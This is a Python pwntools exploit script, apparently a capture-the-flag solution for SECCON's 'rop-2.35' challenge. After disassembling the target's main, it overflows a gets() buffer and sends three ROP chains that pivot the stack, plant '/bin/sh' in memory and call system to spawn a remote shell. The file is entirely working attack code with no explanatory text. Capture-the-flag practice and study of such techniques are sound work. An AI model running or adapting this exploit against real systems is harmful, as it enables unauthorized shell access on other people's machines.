from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "rop-2-35.seccon.games"
    port = 9999
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    if type(x) == str:
        x = x.encode("ascii")
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s)
    r.sendline(s)

def send(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()


# libc safe linking decrypt
def decrypt(cipher):
    key = 0
    plain  = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain

def encrypt(val, addr):
    return val ^ (addr >> 12)


####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b': '):
    recvuntil(r)
    #s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

# send `s` after r
def sa(r, s, new_line=True):
    rs(s, new_line, r)

main=0x401156
system=0x401050
gets = 0x401060

binsh=0x00404b00
ret = 0x0000000000401184

"""
Dump of assembler code for function main:
   0x0000000000401156 <+0>:	endbr64
   0x000000000040115a <+4>:	push   rbp
   0x000000000040115b <+5>:	mov    rbp,rsp
=> 0x000000000040115e <+8>:	sub    rsp,0x10
   0x0000000000401162 <+12>:	lea    rax,[rip+0xe9b]        # 0x402004
   0x0000000000401169 <+19>:	mov    rdi,rax
   0x000000000040116c <+22>:	call   0x401050 <system@plt>
   0x0000000000401171 <+27>:	lea    rax,[rbp-0x10]
   0x0000000000401175 <+31>:	mov    rdi,rax
   0x0000000000401178 <+34>:	mov    eax,0x0
   0x000000000040117d <+39>:	call   0x401060 <gets@plt>
   0x0000000000401182 <+44>:	nop
   0x0000000000401183 <+45>:	leave
   0x0000000000401184 <+46>:	ret
"""

rbp = binsh+0x10
got_gets = 0x404020
payload = [
    rbp,
    0x401171,
]
x = b"A" * 16
x += b"".join(map(p64, payload))

sendline(x)

payload = [
    u64(b"/bin/sh\x00"),
    0,
    0x404020 + 0x10,
    ret,
    0x401171,
    rbp+64,
    rbp+64,
    0x401171,
    u64(b"/bin/sh\x00"),

]
x = b"".join(map(p64, payload))
sendline(x)
leave_ret=0x401183
payload = [
    system,
    0,
    rbp + 32,
    ret,
    leave_ret,
    rbp + 32,
    0x401171,
]
x = b"".join(map(p64, payload))
wait_for_attach()
sendline(x)


interactive()
